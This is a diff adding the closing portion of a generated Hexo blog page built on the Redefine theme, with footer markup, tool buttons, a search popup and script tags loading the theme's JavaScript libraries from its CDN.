+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="站内搜索您需要的内容..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/Swup.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupSlideTheme.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupProgressPlugin.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupScrollPlugin.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupPreloadPlugin.min.js" ></script>
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+<script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/imageViewer.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/utils.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/main.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/navbarShrink.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/scrollTopBottom.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/lightDarkSwitch.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/categoryList.js" ></script>
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/localSearch.js" ></script>
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/codeBlock.js" ></script>
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/lazyload.js" ></script>
+
+
+
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/runtime.js" ></script>
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/odometer.min.js" ></script>
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/Typed.min.js" ></script>
+  <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/plugins/typed.js" ></script>
+
+
+
+
+
+
+
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/anime.min.js" ></script>
+
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/plugins/tabs.js" data-swup-reload-script></script>
+
+
+<script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/moment-with-locales.min.js" data-swup-reload-script></script>
+<script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/essays.js" data-swup-reload-script></script>
+
+
+
+</body>
+</html>
